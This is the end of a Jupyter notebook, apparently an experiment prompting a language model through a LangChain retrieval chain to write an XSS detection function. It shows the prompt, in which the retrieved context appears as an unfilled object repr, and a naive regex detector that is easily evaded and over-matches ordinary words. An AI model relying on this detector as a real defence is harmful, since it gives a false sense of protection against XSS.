       "{'input': 'def detect_xss(http_get_request: str)->bool: \\n\"\"\" Check if in the given http_get_request there is an XSS exploit, considering also the possible evasions that an attacker can perform.\"\"\" ',\n",
       " 'context': VectorStoreRetriever(tags=['Chroma', 'OpenAIEmbeddings'], vectorstore=<langchain.vectorstores.chroma.Chroma object at 0x7f9a909cae90>)\n",
       " | RunnableLambda(...)}"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prompt_parameters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "System: The user will provide the initial part of a python function (function name, parameters with types, return type and a comment describing the purpose of the function) with some optional example. \n",
      "You are a coding assistant that writes some python code to complete the user's function. Be sure that the code is syntactically correct and that it returns the correct type. \n",
      "The length of the code should be short, it should be readable, and without redundant checks on the payload. \n",
      "Return only python code in Markdown format, e.g.:\n",
      "```python\n",
      "....\n",
      "```\n",
      "Use the following pieces of retrieved context to write a more complete function:\n",
      "Context: first=VectorStoreRetriever(tags=['Chroma', 'OpenAIEmbeddings'], vectorstore=<langchain.vectorstores.chroma.Chroma object at 0x7f9a909cae90>) last=RunnableLambda(...)\n",
      "\n",
      "Human: def detect_xss(http_get_request: str)->bool: \n",
      "\"\"\" Check if in the given http_get_request there is an XSS exploit, considering also the possible evasions that an attacker can perform.\"\"\" \n"
     ]
    }
   ],
   "source": [
    "print(prompt.format(**prompt_parameters))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "response = chain.invoke(prompt_parameters)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\nimport re\\n\\ndef detect_xss(http_get_request: str) -> bool:\\n    # Check for common XSS patterns\\n    patterns = [\\n        r\"<script.*?>.*?</script>\",\\n        r\"javascript:\",\\n        r\"on\\\\w+\",\\n        r\"alert\\\\(\",\\n        r\"eval\\\\(\",\\n        r\"document\\\\.\"\\n    ]\\n    \\n    for pattern in patterns:\\n        if re.search(pattern, http_get_request, re.IGNORECASE):\\n            return True\\n    \\n    return False\\n'"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
